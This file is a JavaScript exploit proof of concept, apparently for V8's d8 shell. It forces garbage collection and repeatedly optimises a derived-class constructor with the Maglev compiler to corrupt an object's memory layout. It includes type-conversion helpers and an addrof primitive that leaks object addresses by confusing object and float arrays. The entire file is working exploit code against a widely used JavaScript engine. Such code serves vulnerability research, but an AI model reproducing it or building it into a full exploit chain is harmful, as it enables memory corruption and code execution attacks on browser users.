class Helpers {
    constructor () {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);

        this.roots = new Array(0x30000);
        this.index = 0;

    }

    nop_nop() {

    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }
    print_hex(f) {
        console.log('0x' + this.f64toi64(f).toString(16));
    }
    hex_to_dbl(hexString) {
        if (hexString.startsWith('0x')) {
            hexString = hexString.substring(2);
        }

        for (let i = 0; i < 8; i++) {
            const byte = hexString.substring(hexString.length - (i + 1) * 2, hexString.length - i * 2);
            this.u8[i] = parseInt(byte, 16);
        }

        const float64 = new Float64Array(this.u8.buffer);
        return float64[0];
    }
    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    add_ref(object) {
        this.roots[this.index++] = object;
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }
    trap() {
        while (1) {
        }
    }
}
var helper = new Helpers();

var v;
var empty_object = {};
let corrupted_instance = null;

class A { }
class B extends A {
    constructor () {
        v = new.target;
        let objArr = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object];
        super();
        gc();
        let floatArr = [1.1];

        this.x = objArr;
        this.a = floatArr;
    }
}

function gc() {
    for (let i = 0; i < 1000; i++) {
        new ArrayBuffer(0x10000);
    }
}

function print(name, obj) {
    console.log(`Debug of ${name}`);
    % DebugPrint(obj);
}

function trigger_bug() {
    for (let i = 0; i < 100; i++) {
        if (i < 90) gc();
    }

    % PrepareFunctionForOptimization(B);
    corrupted_instance = new B();

    for (let i = 0; i < 100; i++) {
        % OptimizeMaglevOnNextCall(B);
        corrupted_instance = new B();
    }
}

function addrof_tmp(obj) {
    corrupted_instance.x[0] = obj;
    helper.f64[0] = corrupted_instance.a[0];
    return helper.u32[0];
}

% NeverOptimizeFunction(trigger_bug);
trigger_bug();
print('corrupted_instance.x', corrupted_instance.x);
print('corrupted_instance.x', corrupted_instance.a);